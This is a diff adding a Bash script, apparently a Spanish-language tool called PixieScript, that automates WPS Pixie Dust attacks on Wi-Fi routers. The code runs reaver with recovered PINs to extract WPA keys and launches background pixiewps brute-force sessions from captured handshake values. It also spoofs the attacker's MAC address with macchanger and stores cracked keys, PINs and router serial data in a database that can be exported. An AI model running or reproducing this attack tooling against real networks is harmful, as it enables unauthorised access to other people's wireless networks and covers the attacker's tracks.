+	# 3 Pin conseguido (PC)
+	if [ $1 = "1" ] ; then 
+		CASO="SD";
+	elif [ $1 = "2" ]; then
+		CASO="NV";
+	elif [ $1 = "3" ]; then
+		CASO="PC";
+	else
+		CASO="BF";
+	fi
+	
+	
+	if [ -z $BSSID ];then BSSID=$2; fi
+		
+	SUB_MAC=$(echo ${BSSID:0:8})
+  
+	if grep -q $BSSID "$DATABASE_REDES_ATACADAS"
+	then
+		CASO_VIEJO=$(grep $BSSID "$DATABASE_REDES_ATACADAS" | awk {'print $2'})
+		if [ $CASO_VIEJO = "PC" ];then return;fi
+		if [ $CASO_VIEJO = "SD" ]
+		then
+			if [ $CASO = "PC" ] 
+			then
+				sed '/'$BSSID'/d' "$DATABASE_REDES_ATACADAS" | sed '/^$/d' > TEMPORAL
+				mv TEMPORAL "$DATABASE_REDES_ATACADAS"
+				echo $BSSID" "$CASO >> "$DATABASE_REDES_ATACADAS"
+				sed -i '/^$/d' "$DATABASE_REDES_ATACADAS"
+				
+				if ! grep -q "$SUB_MAC" "$DATABASE_REDES_VULNERABLES"
+				then
+					echo $SUB_MAC >> "$DATABASE_REDES_VULNERABLES"
+					sed -i '/^$/d' "$DATABASE_REDES_VULNERABLES"
+				fi
+				return 
+			fi
+			if [ $CASO = "NV" ] || [ $CASO = "BF" ]
+			then
+				sed '/'$BSSID'/d' "$DATABASE_REDES_ATACADAS" | sed '/^$/d' > TEMPORAL
+				mv TEMPORAL "$DATABASE_REDES_ATACADAS"
+				echo $BSSID" "$CASO >> "$DATABASE_REDES_ATACADAS"
+				sed -i '/^$/d' "$DATABASE_REDES_ATACADAS"
+				return
+			fi
+		fi
+		if [ $CASO_VIEJO = "NV" ]
+		then
+			if [ $CASO = "PC" ] 
+			then
+				sed '/'$BSSID'/d' "$DATABASE_REDES_ATACADAS" | sed '/^$/d' > TEMPORAL
+				mv TEMPORAL "$DATABASE_REDES_ATACADAS"
+				echo $BSSID" "$CASO >> "$DATABASE_REDES_ATACADAS"
+				sed -i '/^$/d' "$DATABASE_REDES_ATACADAS"
+				if ! grep -q $SUB_MAC "$DATABASE_REDES_VULNERABLES"
+				then
+					echo $SUB_MAC >> "$DATABASE_REDES_VULNERABLES"
+					sed -i '/^$/d' "$DATABASE_REDES_VULNERABLES"
+				fi
+				return
+			fi
+			if [ $CASO = "BF" ]
+			then
+				sed '/'$BSSID'/d' "$DATABASE_REDES_ATACADAS" | sed '/^$/d' > TEMPORAL
+				mv TEMPORAL "$DATABASE_REDES_ATACADAS"
+				echo $BSSID" "$CASO >> "$DATABASE_REDES_ATACADAS"
+				sed -i '/^$/d' "$DATABASE_REDES_ATACADAS"
+				return
+			fi
+		fi
+		if [ $CASO_VIEJO = "BF" ]
+		then
+			if [ $CASO = "PC" ] 
+			then
+				sed '/'$BSSID'/d' "$DATABASE_REDES_ATACADAS" | sed '/^$/d' > TEMPORAL
+				mv TEMPORAL "$DATABASE_REDES_ATACADAS"
+				echo $BSSID" "$CASO >> "$DATABASE_REDES_ATACADAS"
+				sed -i '/^$/d' "$DATABASE_REDES_ATACADAS"
+				if ! grep -q $SUB_MAC "$DATABASE_REDES_VULNERABLES"
+				then
+					echo $SUB_MAC >> "$DATABASE_REDES_VULNERABLES"
+					sed -i '/^$/d' "$DATABASE_REDES_VULNERABLES"
+				fi
+				return
+			fi
+			if [ $CASO = "NV" ] 
+			then
+				sed '/'$BSSID'/d' "$DATABASE_REDES_ATACADAS" | sed '/^$/d' > TEMPORAL
+				mv TEMPORAL "$DATABASE_REDES_ATACADAS"
+				echo $BSSID" "$CASO >> "$DATABASE_REDES_ATACADAS"
+				sed -i '/^$/d' "$DATABASE_REDES_ATACADAS"
+				return
+			fi
+		fi
+	else
+		echo $BSSID" "$CASO >> "$DATABASE_REDES_ATACADAS"
+		if [ $CASO = "PC" ] 
+		then
+			if ! grep -q $SUB_MAC "$DATABASE_REDES_VULNERABLES"
+			then
+				echo $SUB_MAC >> "$DATABASE_REDES_VULNERABLES"
+				sed -i '/^$/d' "$DATABASE_REDES_VULNERABLES"
+			fi
+		fi
+	fi
+}
+
+
+AnalizarLogPixiewps(){
+	echo "***************** AnalizarLogPixiewps"
+	nombre_archivo=$(echo "$nombre_archivo.resultado")
+	RESULTADO=$(cat $nombre_archivo)
+		
+	case $RESULTADO in
+		"0") 	echo "$BSSID : ATAQUE FALLIDO, BSSID NO VULNERABLE A PIXIEWPS ATTACK" > "$LOG_STATUSBAR"
+			AgregarBssidDatabases 2
+			ATAQUE_ACABADO="SI"
+			if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosScaneo; fi
+			sudo rm $nombre_archivo
+			return 1
+			;;
+		"1") 	if [ $AUTOMATICO = "NO" ]
+			then
+				seguir=$(yad --image "dialog-question" --title "SESION BRUTEFORCE" --button=gtk-yes:1 --yes-label "SI" --button=gtk-no:0 --text "No se ha conseguido el PIN con el ataque sencillo. ¿ Quieres iniciar una sesión de fuerza bruta para $BSSID ? " --width=450 --on-top --center --window-icon=$ICONO_SOFT)
+				ret=$?
+				if [ $ret = "1" ]
+				then
+					if [ -f "$RUTA_BRUTEFORCE/$BSSID.BF" ]
+					then
+						echo "$BSSID : YA HAY UNA SESION DE BRUTEFORCE PARA $BSSID, NO SE AÑADIRA" > "$LOG_STATUSBAR"
+						ATAQUE_ACABADO="SI"
+						rm $nombre_archivo
+						return 1
+					fi
+					RecopilarDatosBruteforce
+					echo "$BSSID : AÑADIDO A SESIONES DE BRUTEFORCE" > "$LOG_STATUSBAR"
+					AgregarBssidDatabases 4
+					ATAQUE_ACABADO="SI"
+					if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosScaneo; fi
+					rm $nombre_archivo
+					return 1
+				else
+					echo "$BSSID : ATAQUE FALLIDO, BSSID NO VULNERABLE A PIXIEWPS ATTACK" > "$LOG_STATUSBAR"
+					AgregarBssidDatabases 2
+					ATAQUE_ACABADO="SI"
+					if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosScaneo; fi
+					rm $nombre_archivo
+					return 1
+				fi
+			fi 
+			;;
+	esac
+		
+	PIN_WPS=$(echo $RESULTADO)
+	rm $nombre_archivo
+	
+	if [ "${#PIN_WPS}" != 8 ]
+	then
+		echo "$BSSID : SE HA PRODUCIDO UN ERROR RECUPERANDO EL PIN WPS" > "$LOG_STATUSBAR"
+		ATAQUE_ACABADO="SI"
+		return 1
+	fi
+
+	echo "$BSSID : PIN WPS CONSEGUIDO, RECUPERANDO CLAVE WPA, ESPERA ..." > "$LOG_STATUSBAR"
+	TIEMPO_ATAQUE="100"
+	sudo "$REAVER" -i $TARJETA_MODO_MONITOR -b $BSSID -a -D -X -p $PIN_WPS -n -N -vv >> "$LOG_ATAQUE"
+	VEZ="WPA"
+	
+	if EsperarAcabarReaver
+	then
+		if [ -f "$SEMAFORO_DETENER_ATAQUE" ]; then return; fi	
+		CLAVE_WPA=$(grep "WPA PSK" "$LOG_ATAQUE" | awk -F"'" {' print $2 '})
+		CLAVE_WPA=$(echo $CLAVE_WPA)
+	else
+		CLAVE_WPA="NO SE HA PODIDO RECUPERAR LA CLAVE WPA"
+	fi
+        
+        ESSID=$(echo $ESSID)
+	echo $fabricante > "$LOG_ATAQUE"
+	echo $modelo >> "$LOG_ATAQUE"
+	echo $numero_de_modelo >> "$LOG_ATAQUE"
+	echo $numero_de_serie >> "$LOG_ATAQUE"
+	echo $device_name  >> "$LOG_ATAQUE"
+	echo "- ESSID : "$ESSID >> "$LOG_ATAQUE"
+	echo "- BSSID : "$BSSID  >> "$LOG_ATAQUE"
+	echo "- PIN WPS : "$PIN_WPS >> "$LOG_ATAQUE"
+	echo "- KEY WPA : "$CLAVE_WPA >> "$LOG_ATAQUE"
+	
+	Archivo_Datos="$RUTA_CLAVES/$ESSID.DATOS"
+    
+	echo $fabricante > "$Archivo_Datos"
+	echo $modelo >> "$Archivo_Datos"
+	echo $numero_de_modelo >> "$Archivo_Datos"
+	echo $numero_de_serie >> "$Archivo_Datos"
+	echo $device_name  >> "$Archivo_Datos"
+	echo "- ESSID : "$ESSID >> "$Archivo_Datos"
+	echo "- BSSID : "$BSSID  >> "$Archivo_Datos"
+	echo "- PIN WPS : "$PIN_WPS >> "$Archivo_Datos"
+	echo "- KEY WPA : "$CLAVE_WPA >> "$Archivo_Datos"
+    
+	fabricante=$(echo $fabricante | awk -F":" {' print $2 '})
+	modelo=$(echo $modelo | awk -F":" {' print $2 '})
+	numero_de_modelo=$(echo $numero_de_modelo | awk -F":" {' print $2 '})
+	numero_de_serie=$(echo $numero_de_serie | awk -F":" {' print $2 '})
+	device_name=$(echo $device_name | awk -F":" {' print $2 '})
+    
+    	if ! grep -q $BSSID "$DATABASE_CLAVES_CONSEGUIDAS"
+	then
+		if [ "$CLAVE_WPA" = "NO SE HA PODIDO RECUPERAR LA CLAVE WPA" ]; then CLAVE_WPA="?"; fi 
+		echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|"$numero_de_serie"|"$device_name >> $DATABASE_CLAVES_CONSEGUIDAS
+	else
+		if [ $(grep $BSSID "$DATABASE_CLAVES_CONSEGUIDAS" | awk -F"|" {'print $4'}) = "?" ] && [ $CLAVE_WPA != "?" ] 
+		then
+			sed '/'$BSSID'/d' "$DATABASE_CLAVES_CONSEGUIDAS" | sed '/^$/d' > TEMPORAL
+			mv TEMPORAL "$DATABASE_CLAVES_CONSEGUIDAS"
+			echo $ESSID"|"$BSSID"|"$PIN_WPS"|"$CLAVE_WPA"|"$fabricante"|"$modelo"|"$numero_de_modelo"|"$numero_de_serie"|"$device_name >> $DATABASE_CLAVES_CONSEGUIDAS
+		fi
+	fi    
+	echo "$BSSID : ATAQUE FINALIZADO, SE HA GENERADO EL ARCHIVO $ESSID.DATOS" > "$LOG_STATUSBAR"
+      
+	AgregarBssidDatabases 3
+	ATAQUE_ACABADO="SI"
+	if [ $ACTUALIZAR_SCAN = "SI" ]; then ProcesarDatosScaneo; fi 
+}
+
+
+ValidarMac() {
+	echo "***************** ValidarMac"
+	MAC_A_VALIDAR=$1
+	if [ -z $MAC_A_VALIDAR ] || [ "${#MAC_A_VALIDAR}" != 17 ]; then return 1;fi
+
+	for ((i=1; i<=17; i++)); do
+		caracter=$(expr substr $MAC_A_VALIDAR $i 1)
+		case $i in
+			3|6|9|12|15) if [ $caracter != ":" ]; then return 1; fi ;;
+			2) if [[ ! $caracter =~ [ACEace02468] ]]; then return 1; fi ;;
+			1|4|5|7|8|10|11|13|14|16|17) if [[ ! $caracter =~ [A-Fa-f0-9] ]]; then return 1; fi;;
+		esac
+	done
+	return 0
+}
+
+
+ValidarTiempos() {
+	echo "***************** ValidarTiempos"
+	TIEMPO=$1
+	if [ $TIEMPO -lt 1 ] ; then
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: El tiempo máximo introducido no es correcto : [ $TIEMPO ]" --on-top --center --window-icon=$ICONO_SOFT
+		echo "El tiempo máximo introducido no es correcto : [ $TIEMPO ]" > "$LOG_STATUSBAR"
+		return 1
+	fi
+	return 0
+}
+
+
+CambioMacRandom() {
+	echo "***************** CambioMacRandom"
+	INTERFACE_MONITOR=$(head -2 "$LOG_MODO_MONITOR" | tail -1) 
+	if [ -z $INTERFACE_MONITOR ]
+	then
+		yad --image "info" --title "ATENCION" --button=gtk-ok:0 --text "<b>ATENCION</b>: Debes activar primero el modo monitor para cambiar la MAC" --width=400  --on-top --center --window-icon=$ICONO_SOFT 
+		return
+	fi
+	#DeshabilitarNetworkManager OFF
+	TARJETA_SELECCIONADA=$INTERFACE_MONITOR
+	sudo ifconfig $INTERFACE_MONITOR down
+	sudo macchanger -a $INTERFACE_MONITOR
+	sudo ifconfig $INTERFACE_MONITOR up
+	NUEVA_MAC="$(cat "/sys/class/net/$TARJETA_SELECCIONADA/address"|tr '[:lower:]' '[:upper:]')"
+	DeshabilitarNetworkManager ON
+	echo "La nueva mac para $INTERFACE_MONITOR es $NUEVA_MAC" > "$LOG_STATUSBAR"
+	unset INTERFACE_MONITOR TARJETA_SELECCIONADA NUEVA_MAC
+}
+
+
+CambioMacManual() {
+	echo "***************** CambioMacManual"
+	INTERFACE_MONITOR=$(head -2 "$LOG_MODO_MONITOR" | tail -1) 
+	if [ -z $INTERFACE_MONITOR ]
+	then
+		yad --image "info" --title "ATENCION" --button=gtk-ok:0 --text "<b>ATENCION</b>: Debes activar primero el modo monitor para cambiar la MAC" --width=400  --on-top --center --window-icon=$ICONO_SOFT 
+		return
+	fi
+	TARJETA_SELECCIONADA=$INTERFACE_MONITOR
+	DATOS_NUEVA_MAC=$(yad --width=400 --title="CAMBIO DE MAC" --text="<b>Introduce la MAC ADRESS deseada</b>" --on-top --center --window-icon=$ICONO_SOFT \
+	--form \
+	--image=$ICONO_SCRIPT \
+	--field="MAC ADRESS" )
+	NUEVA_MAC=$(echo $DATOS_NUEVA_MAC | awk  '{print toupper($0)}' | sed 's/|/ /g')
+	if [ -z $NUEVA_MAC ]; then return; fi                                                                                                                                                     
+
+	if  ! ValidarMac $NUEVA_MAC
+	then 
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Formato de mac incorrecto" --fixed --on-top --center --window-icon=$ICONO_SOFT 
+		return
+	fi
+	sudo ifconfig $INTERFACE_MONITOR down
+	sudo macchanger -m $NUEVA_MAC $INTERFACE_MONITOR
+	sudo ifconfig $INTERFACE_MONITOR up
+	NUEVA_MAC_ASEGURAR="$(cat "/sys/class/net/$TARJETA_SELECCIONADA/address"|tr '[:lower:]' '[:upper:]')"
+	if [ $NUEVA_MAC_ASEGURAR = $NUEVA_MAC ]
+	then
+		DeshabilitarNetworkManager ON
+		echo "La nueva mac para $INTERFACE_MONITOR es $NUEVA_MAC" > "$LOG_STATUSBAR"
+	else
+		echo "No se ha podido cambiar la MAC ADRESS en $INTERFACE_MONITOR" > "$LOG_STATUSBAR"
+	fi
+	unset INTERFACE_MONITOR TARJETA_SELECCIONADA DATOS_NUEVA_MAC NUEVA_MAC NUEVA_MAC_ASEGURAR
+}
+
+
+CopiarPortapapeles(){
+	echo "***************** CopiarPortapapeles"
+	if [ -z $LINEA_PORTAPAPELES ]
+	then
+	      yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Debes seleccionar un AP" --on-top --center --window-icon=$ICONO_SOFT
+	      return
+	fi
+	LINEA_P=$(grep $LINEA_PORTAPAPELES $DATABASE_CLAVES_CONSEGUIDAS)
+	COLUMNA_A_COPIAR=$(echo $1)
+
+	case $COLUMNA_A_COPIAR in
+		"WPA") LINEA_P=$(echo $LINEA_P | awk -F"|" {'print $4'})
+			echo -n $LINEA_P | "$XCLIP" -selection clipboard 
+			;;
+		"WPS") LINEA_P=$(echo $LINEA_P | awk -F"|" {'print $3'})
+			echo -n $LINEA_P | "$XCLIP" -selection clipboard 
+			;;
+		"TODO") LINEA_P=$(echo $LINEA_P | awk -F"|" {' print $1,$2,$3,$4,$5,$6,$7,$8,$9 '})
+			echo -n $LINEA_P | "$XCLIP" -selection clipboard 
+			;;
+	esac
+	unset COLUMNA_A_COPIAR LINEA_P
+}
+
+
+ExportarKeys(){
+	echo "***************** ExportarKeys"
+	ARCHIVO_EXP=$(date +%d-%m-%Y)
+	ARCHIVO_EXP="PixieScript_$ARCHIVO_EXP.DATOS"
+	PATH_ARCHIVO_EXP="$HOME/$ARCHIVO_EXP"
+
+	palabras=$(wc -w $DATABASE_CLAVES_CONSEGUIDAS | awk {' print $1 '})
+	if [ "$palabras" -gt "1" ] 
+	then
+		TOTAL=$(wc -l $DATABASE_CLAVES_CONSEGUIDAS | awk {'print $1'})
+		#TOTAL=$(expr $TOTAL + 1)
+		for A in `seq 1 $TOTAL` ; do
+			LP=$(head -$A $DATABASE_CLAVES_CONSEGUIDAS | tail -1)
+			LP=$(echo $LP | awk -F"|" {' print $1,$2,$3,$4,$5,$6,$7,$8,$9 '})
+			echo $LP >> $PATH_ARCHIVO_EXP
+			echo "" >> $PATH_ARCHIVO_EXP
+		done 
+		echo "SE HAN EXPORTADO LOS DATOS AL ARCHIVO $ARCHIVO_EXP , LO ENCONTRARAS EN TU CARPETA DE USUARIO" > $LOG_STATUSBAR
+	fi
+	unset ARCHIVO_EXP LP PATH_ARCHIVO_EXP palabras TOTAL
+}
+
+
+ActualizarDatabase(){
+	echo "***************** ActualizarDatabase"
+	echo "Buscando nueva versión de la base de datos de APs afectados" > "$LOG_STATUSBAR"
+	if ! ComprobarConexion
+	then
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Necesitas una conexión a internet para poder actualizar" --fixed --on-top --center --window-icon=ICONOS/SCRIPT.png 
+		return
+	fi
+	version_actual=$(head -1 $DATABASE_REDES_VULNERABLES | awk -F"." {' print $2 '} | sed -n -e '1x;1!H;${x;s-\r- -gp}')
+	curl -s http://pastebin.com/raw.php?i=nk9pYusb > DATABASE_TEMP
+	version_disponible=$(head -1 DATABASE_TEMP | awk -F"." {' print $2 '} | sed -n -e '1x;1!H;${x;s-\r- -gp}')
+
+	let version_actual=$(printf %d $version_actual)
+	let version_disponible=$(printf %d $version_disponible)
+	
+	if [ "$version_actual" -lt "$version_disponible" ]
+	then
+		echo -e "\r" >> DATABASE_TEMP
+		while read linea
+		do 
+			if ! grep -q $linea DATABASE_TEMP 
+			then
+				if [ ${#linea} = 9 ]; then echo $linea >> DATABASE_TEMP ; fi
+			fi
+		done < $DATABASE_REDES_VULNERABLES
+		mv DATABASE_TEMP $DATABASE_REDES_VULNERABLES
+		echo "Se ha actualizado la base de datos de los BSSIDs vulnerables" > "$LOG_STATUSBAR"
+  	else
+		rm DATABASE_TEMP
+		echo "Ya dispones de la última versión de BSSIDs vulnerables" > "$LOG_STATUSBAR"
+	fi
+	unset version_actual version_disponible
+}
+
+
+ActualizarScript(){
+	echo "***************** ActualizarScript"
+	echo "Buscando nueva versión de PixieScript" > "$LOG_STATUSBAR"
+	if ! ComprobarConexion
+	then
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Necesitas una conexión a internet para poder actualizar" --on-top --center --window-icon=$ICONO_SOFT 
+		return
+	fi
+	wget https://sourceforge.net/projects/pixiescript/ 
+	LINEA_VERSION=$(cat index.html | grep "/projects/pixiescript/files/latest/download" | awk {' print $4  '} | awk -F"v" {' print $2 '})
+	VERSION_DISPONIBLE=$(echo $LINEA_VERSION |  awk -F"." {' print $1 '})
+	SUBVERSION_DISPONIBLE=$(echo $LINEA_VERSION | awk -F"." {' print $2'})
+	SUB_SUBVERSION_DISPONIBLE=$(echo $LINEA_VERSION | awk -F"." {' print $3'})
+		
+	VERSION_ACTUAL=$(echo $VERSION | awk -F"." {' print $1 '})
+	SUBVERSION_ACTUAL=$(echo $VERSION | awk -F"." {' print $2 '})
+	SUB_SUBVERSION_ACTUAL=$(echo $VERSION | awk -F"." {' print $3 '})
+	if [ -z $SUB_SUBVERSION_ACTUAL ]; then SUB_SUBVERSION_ACTUAL=0 ; fi
+	
+	ACTUALIZAR="NO"
+	if [ $VERSION_ACTUAL -lt $VERSION_DISPONIBLE ]; then ACTUALIZAR="SI"; fi
+	if [ $VERSION_ACTUAL -eq $VERSION_DISPONIBLE ] && [ $SUBVERSION_ACTUAL -lt $SUBVERSION_DISPONIBLE ]; then ACTUALIZAR="SI"; fi
+	if [ $VERSION_ACTUAL -eq $VERSION_DISPONIBLE ] && [ $SUBVERSION_ACTUAL -eq $SUBVERSION_DISPONIBLE ] && [ $SUB_SUBVERSION_ACTUAL -lt $SUB_SUBVERSION_DISPONIBLE ]; then ACTUALIZAR="SI"; fi
+	
+	if [ $ACTUALIZAR = "SI"  ]
+	then
+		echo "Hay una nueva versión disponible : PixieScript_$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE.$SUB_SUBVERSION_DISPONIBLE" > "$LOG_STATUSBAR"
+		descargar=$(yad --image "dialog-question" --title "ACTUALIZACION DISPONIBLE" --button=gtk-yes:1 --yes-label "SI" --button=gtk-no:0 --text "<b>NUEVA VERSION DISPONIBLE</b>: ¿ Quieres descargar la versión PixieScript_$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE.$SUB_SUBVERSION_DISPONIBLE ?" --width=450 --on-top --center --window-icon=$ICONO_SOFT)
+		ret=$?
+		if [ $ret = "1" ]
+		then
+			wget http://downloads.sourceforge.net/project/pixiescript/PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE.$SUB_SUBVERSION_DISPONIBLE.tar.gz 
+			mv PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE.$SUB_SUBVERSION_DISPONIBLE.tar.gz "$HOME/PixieScript_v$VERSION_DISPONIBLE.$SUBVERSION_DISPONIBLE.$SUB_SUBVERSION_DISPONIBLE.tar.gz"
+			echo "Se ha descargado la nueva versión, la encontrarás en tu carpeta de usuario" > "$LOG_STATUSBAR"
+		fi
+	else
+		echo "Ya dispones de la última versión del script" > "$LOG_STATUSBAR"
+	fi
+	rm index.html* 
+	unset  VERSION_DISPONIBLE SUBVERSION_DISPONIBLE VERSION_ACTUAL SUBVERSION_ACTUAL ACTUALIZAR descargar ret
+}
+
+
+ComprobarConexion(){
+	echo "***************** ComprobarConexion"
+	ping -c 4 www.google.com 
+	if [ "$?" -eq 0 ]
+	then
+		return 0
+	else
+		return 1
+	fi
+}
+
+
+RecopilarDatosBruteforce(){
+	echo "***************** RecopilarDatosBruteforce"
+	echo "$PKe" > "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$PKr" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$EHash1" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$EHash2" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$AuthKey" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$Enrollee" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$BSSID" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$ESSID" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$fabricante" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$modelo" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$numero_de_modelo" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$numero_de_serie" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	echo "$device_name" >> "$RUTA_BRUTEFORCE/$BSSID.BF"
+	AgregarSesion $BSSID &
+}
+
+
+AgregarSesion() {
+	echo "***************** AgregarSesion"
+	bssid=$1
+	echo "DETENIDO|-|-|-|$bssid|100|NORMAL (0)|-" >> "$LOG_SESIONES_BRUTEFORCE"
+	sed -i '/^$/d' "$LOG_SESIONES_BRUTEFORCE"
+	MAXIMAS_SESIONES=$(cat "$LOG_MAXIMAS_SESIONES_BRUTEFORCE")
+	SESIONES_ACTIVAS=$(awk 'BEGIN{FS=":"} {print $1}' < "$LOG_SESIONES_BRUTEFORCE" | sort | uniq -c | grep ACTIVO | awk '{print $1}')
+	if [ -z  $SESIONES_ACTIVAS ]; then SESIONES_ACTIVAS="0"; fi
+	if [ $SESIONES_ACTIVAS -lt $MAXIMAS_SESIONES ]; then IniciarSesion $bssid; fi
+	unset bssid MAXIMAS_SESIONES SESIONES_ACTIVAS
+}
+
+
+IniciarSesion(){
+	echo "***************** IniciarSesion"
+	bssid=$1
+	pke=$(head -1 "$RUTA_BRUTEFORCE/$bssid.BF" | tail -1)
+	pkr=$(head -2 "$RUTA_BRUTEFORCE/$bssid.BF" | tail -1)
+	eh1=$(head -3 "$RUTA_BRUTEFORCE/$bssid.BF" | tail -1)
+	eh2=$(head -4 "$RUTA_BRUTEFORCE/$bssid.BF" | tail -1)
+	auk=$(head -5 "$RUTA_BRUTEFORCE/$bssid.BF" | tail -1) 
+	enr=$(head -6 "$RUTA_BRUTEFORCE/$bssid.BF" | tail -1)
+	"$PIXIE" -e $pke -r $pkr -s $eh1 -z $eh2 -a $auk -n $enr -f -v 3 &>> "$RUTA_BRUTEFORCE/$bssid.SESION" &
+	PID_SESION=$!
+	HORA_INICIO=$(date +"%H:%M:%S")
+	LINEA1="DETENIDO|-|-|-|$bssid|100|NORMAL (0)|-"
+	LINEA2="ACTIVO|$PID_SESION|$HORA_INICIO|-|$bssid|100|NORMAL (0)|-"
+	sed -i "s/${LINEA1}/${LINEA2}/g" "$LOG_SESIONES_BRUTEFORCE"
+	unset bssid pke pkr eh1 eh2 auk enr PID_SESION HORA_INICIO LINEA1 LINEA2
+}
+
+
+ComprobarSesiones() {
+	sudo echo "***************** ComprobarSesiones"
+	sudo -v
+	if [ -z "$(grep ACTIVO "$LOG_SESIONES_BRUTEFORCE")" ] ; then return; fi
+	for archivo in $( ls "$RUTA_BRUTEFORCE/"*SESION)
+	do
+		if [ $(wc -l "$archivo" | awk '{print $1}') -gt 0 ];then SesionTerminada "$archivo"; fi
+	done
+	unset archivo
+}
+
+
+SesionTerminada(){
+	echo "***************** SesionTerminada"
+	SESION_TERMINADA=$1
+	bssid_f=$(echo $SESION_TERMINADA | awk -F"/" '{print $NF}' | awk -F".SESION" '{print $1}')
+	mv "$SESION_TERMINADA" "$RUTA_BRUTEFORCE/TEMPORAL"
+	tiempo=$(cat "$RUTA_BRUTEFORCE/TEMPORAL" | awk -F":" '{ print $2 }' | awk '{ print $1 }')
+	tiempo=$(echo - | awk -v "S=$tiempo" '{printf "%02d:%02d:%02d",S/(60*60),S%(60*60)/60,S%60}')
+	if grep -q "WPS pin not found" "$RUTA_BRUTEFORCE/TEMPORAL"    
+	then
+		PIN_WPS_f="NO"
+		AgregarBssidDatabases 2 $bssid_f
+		echo "$bssid_f : SESION BRUTEFORCE FINALIZADA SIN EXITO, DURACION $tiempo" > "$LOG_STATUSBAR"
+		
+	else
+		PIN_WPS_f=$(grep "WPS pin" "$RUTA_BRUTEFORCE/TEMPORAL" | awk -F":" {' print $2 '})
+		AgregarBssidDatabases 3 $bssid_f
+		
+		essid_f=$(head -8 "$RUTA_BRUTEFORCE/$bssid_f.BF" | tail -1)
+		fabricante_f=$(head -9 "$RUTA_BRUTEFORCE/$bssid_f.BF" | tail -1)
+		modelo_f=$(head -10 "$RUTA_BRUTEFORCE/$bssid_f.BF" | tail -1)
+		numero_de_modelo_f=$(head -11 "$RUTA_BRUTEFORCE/$bssid_f.BF" | tail -1)
+		numero_de_serie_f=$(head -12 "$RUTA_BRUTEFORCE/$bssid_f.BF" | tail -1)
+		device_name_f=$(head -13 "$RUTA_BRUTEFORCE/$bssid_f.BF" | tail -1)
+		
+		if ! grep -q $bssid_f "$DATABASE_CLAVES_CONSEGUIDAS"
+		then
+			CLAVE_WPA_f="?" 
+			echo $essid_f"|"$bssid_f"|"$PIN_WPS_f"|"$CLAVE_WPA_f"|"$fabricante_f"|"$modelo_f"|"$numero_de_modelo_f"|"$numero_de_serie_f"|"$device_name_f >> $DATABASE_CLAVES_CONSEGUIDAS
+		fi
+		echo "$bssid_f : SESION BRUTEFORCE FINALIZADA CON EXITO, DURACION $tiempo (PIN : $PIN_WPS_f)" > "$LOG_STATUSBAR"
+	fi
+		
+	#rm "$RUTA_BRUTEFORCE/$bssid_f.BF"
+	rm "$RUTA_BRUTEFORCE/TEMPORAL" 
+
+	HORA_FINAL="$(date +"%H:%M:%S")"
+	LINEA1_f=$(grep $bssid_f $LOG_SESIONES_BRUTEFORCE)
+	c1=$(echo $LINEA1_f | awk -F"|" '{print $3}') #HORA INICIO
+	c2=$(echo $LINEA1_f | awk -F"|" '{print $8}') #PIN
+	LINEA2_f="FINALIZADO|-|$c1|$HORA_FINAL|$bssid_f|-|-|$PIN_WPS_f"
+	sed -i "s/${LINEA1_f}/${LINEA2_f}/g" "$LOG_SESIONES_BRUTEFORCE"
+	
+	SIGUIENTE_SESION=$(grep -m 1 "DETENIDO" "$LOG_SESIONES_BRUTEFORCE")
+	
+	if [ -n "$SIGUIENTE_SESION" ] 
+	then
+		sed -i "/${SIGUIENTE_SESION}/d" "$LOG_SESIONES_BRUTEFORCE"
+		SIGUIENTE_SESION=$(echo "$SIGUIENTE_SESION" | awk -F"|" '{ print $5 }')
+		AgregarSesion "$SIGUIENTE_SESION"
+	fi
+	unset SESION_TERMINADA bssid_f PIN_WPS_f essid_f fabricante_f modelo_f numero_de_modelo_f numero_de_serie_f device_name_f HORA_FINAL LINEA1_f c1 c2 LINEA2_f SIGUIENTE_SESION
+}
+
+
+AccionesBruteforce() {
+	echo "***************** AccionesBruteforce $1"
+	ACCION_b=$1
+	LINEA_SESION_b=$2
+	VALOR_b=$3
+	
+	if [ -z "$LINEA_SESION_b" ] || [ "${#LINEA_SESION_b}" != 17  ] && [ "$ACCION_b" != 3 ]
+	then
+		yad --image "error" --title "ERROR" --button=gtk-ok:0 --text "<b>ERROR</b>: Debes seleccionar una sesión para aplicar los cambios" --on-top --center --window-icon=$ICONO_SOFT
+		touch $LOG_TIMER_BRUTEFORCE
+		return
+	fi
+
+	LINEA_SESION_b=$(grep "$LINEA_SESION_b" "$LOG_SESIONES_BRUTEFORCE")
+	ESTADO_b=$(echo $LINEA_SESION_b | awk -F"|" '{print $1}') 
+	PID_b=$(echo $LINEA_SESION_b | awk -F"|" '{print $2}') 
+	HORA_INICIO_b=$(echo $LINEA_SESION_b | awk -F"|" '{print $3}')
+	HORA_FINAL_b=$(echo $LINEA_SESION_b | awk -F"|" '{print $4}') 
+	BSSID_b=$(echo $LINEA_SESION_b | awk -F"|" '{print $5}')
